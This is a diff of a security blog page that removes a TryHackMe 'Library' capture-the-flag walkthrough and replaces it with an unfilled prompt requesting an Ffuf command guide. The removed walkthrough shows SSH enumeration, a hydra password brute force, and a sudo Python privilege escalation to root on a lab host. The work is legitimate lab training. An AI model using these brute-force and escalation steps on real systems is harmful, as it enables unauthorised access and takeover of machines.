@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Library | Technical Intelligence Labs</title>
+    <title>Ffuf Command List | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,90 +106,36 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
-                <span>// 2024-12-30</span>
-                <span>// ID: REF-Library</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">commands</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Ffuf Command List</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Library</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Ffuf Command List</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- tryhackme, ctf -->
+                <!-- ffuf, cybersecurity, command reference, beginner -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-
-<pre class="codehilite"><code>└─$ searchsploit openssh 7.2p2
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                                | linux/remote/45233.py
-OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                          | linux/remote/45210.py
-OpenSSH 7.2 - Denial of Service                                                                                         | linux/dos/40888.py
-OpenSSH 7.2p2 - Username Enumeration                                                                                    | linux/remote/40136.py
-OpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                    | linux/local/40962.txt
-OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                | linux/remote/40963.txt
-OpenSSH &lt; 7.7 - User Enumeration (2)                                                                                    | linux/remote/45939.py
-OpenSSHd 7.2p2 - Username Enumeration   
-</code></pre>
-
-<pre class="codehilite"><code>msf auxiliary(scanner/ssh/ssh_enumusers) &gt; set rhosts 10.66.174.57
-rhosts =&gt; 10.66.174.57
-msf auxiliary(scanner/ssh/ssh_enumusers) &gt; run
-[*] 10.66.174.57:22 - SSH - Using malformed packet technique
-[*] 10.66.174.57:22 - SSH - Checking for false positives
-[-] 10.66.174.57:22 - SSH - throws false positive results. Aborting.
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-</code></pre>
-
-<pre class="codehilite"><code>hydra -t 20 -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.66.174.57
-
-[22][ssh] host: 10.66.174.57   login: meliodas   password: iloveyou1
-1 of 1 target successfully completed, 1 valid password found
-</code></pre>
-
-<pre class="codehilite"><code>meliodas@ubuntu:~$ cat user.txt
-</code></pre>
-
-<pre class="codehilite"><code>meliodas@ubuntu:~$ cat bak.py
-#!/usr/bin/env python
-import os
-import zipfile
-
-def zipdir(path, ziph):
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            ziph.write(os.path.join(root, file))
-
-if __name__ == '__main__':
-    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
-    zipdir('/var/www/html', zipf)
-    zipf.close()
-meliodas@ubuntu:~$ sudo -l
-Matching Defaults entries for meliodas on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User meliodas may run the following commands on ubuntu:
-    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
-</code></pre>
-
-<pre class="codehilite"><code>meliodas@ubuntu:~$ echo 'import pty;pty.spawn(&quot;/bin/bash&quot;)' &gt; bak.py
-meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
-root@ubuntu:~# cd /root
-root@ubuntu:/root# ls
-root.txt
-root@ubuntu:/root# cat root.txt
-</code></pre>
+<h1>Ffuf Command Guide</h1>
+<p>Please generate a detailed educational guide for the <strong>Ffuf</strong> tool.<br />
+Follow this structure exactly:</p>
+<ol>
+<li><strong>Brief Explanation</strong>: Explain what Ffuf is and why it's used in cybersecurity.</li>
+<li><strong>Top 10 Useful Commands</strong>: List the 10 most common/useful commands for this tool.<ul>
+<li>For EACH command, provide the exact syntax in a code block.</li>
+<li>Explain what each flag does (<code>-x</code>, <code>-u</code>, etc.).</li>
+<li>Explain the <em>output</em> and <em>why</em> you would use this specific command.</li>
+</ul>
+</li>
+<li><strong>The Most Powerful Command</strong>: Highlight the single most powerful or "all-in-one" command for this tool and explain its power.</li>
+</ol>
+<p><strong>Tone</strong>: Educational, for a beginner student.</p>
         </div>
     </main>
 
